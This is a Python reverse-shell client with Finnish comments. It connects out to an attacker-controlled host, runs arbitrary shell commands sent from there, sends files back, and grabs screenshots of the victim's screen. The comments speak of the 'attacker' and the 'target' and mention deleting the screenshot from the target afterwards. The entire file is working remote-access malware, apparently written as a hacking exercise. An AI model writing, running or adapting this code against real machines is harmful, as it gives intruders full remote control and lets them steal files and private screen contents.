import socket
import subprocess
import os
#pip/pip3 install pillow -kuvankaappaukseen
from PIL import ImageGrab

def download(s,command):
    #otetaan tedoston nimi talteen(index[1]), splittamalla välilyönnistä
    # esim "download kuva.jpg" --> kuva.jpg 
    filename = command.split()[1]
    #jos löytyy niin luetaan sisään byteinä (rb)
    if os.path.exists(filename):
        with open(filename, 'rb') as f:
            #luetaan 1kilobyte kerrallaan ja luupataan loppuun asti 
            bits = f.read(1024)
            while len(bits) > 0:
                s.send(bits)
                bits = f.read(1024)
            #laitetaan lippu loppuun ('DONE') että tiedätään endpoint
            s.send(b'DONE')
    else:
        s.send('File not found')

def vaihda_dirri(s,command):
    #perus settii.. os moduulista path.exists ja chdir
    path = command.split()[1]
    if os.path.exists(path):
        os.chdir(path)
        s.send(f'Directory changed to {os.getcwd()}'.encode())
    else:
        s.send(b'Invalid directory name')

def aja_komento(s,command):
    #subprocessilla voidaan ajaa prosesseja ja ottaa output talteen
    result = subprocess.run(command, shell=True, capture_output=True)
    if result.returncode == 0:
        s.send(result.stdout)
    else:
        s.send(b'Invalid Command')

def main():
    #vaihda oma ip
    host_ip = '192.168.56.1'
    port    = 8888
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host_ip, port))

    #pääluuppi mihin voidaan lisätä toimminnallisuutta
    while True:
        #attackerin komento luetaan sisään ja decodataan se
        command = s.recv(1024).decode('ISO-8859-1')
        if command == 'exit':
            s.close()
            break
        elif command.startswith('cd') and len(command) > 3:
            vaihda_dirri(s,command)
        elif command.startswith('download'):
            download(s,command)
        elif command.startswith('screen'):
            #valmis luokka tallentaa screenshotin. 
            # --> poistetaan se targetilta myöhemmin
            ImageGrab.grab().save('screen.jpg','JPEG')
            download(s,'grab screen.jpg')
        else:
             aja_komento(s,command)
     

if __name__ == '__main__':
    main()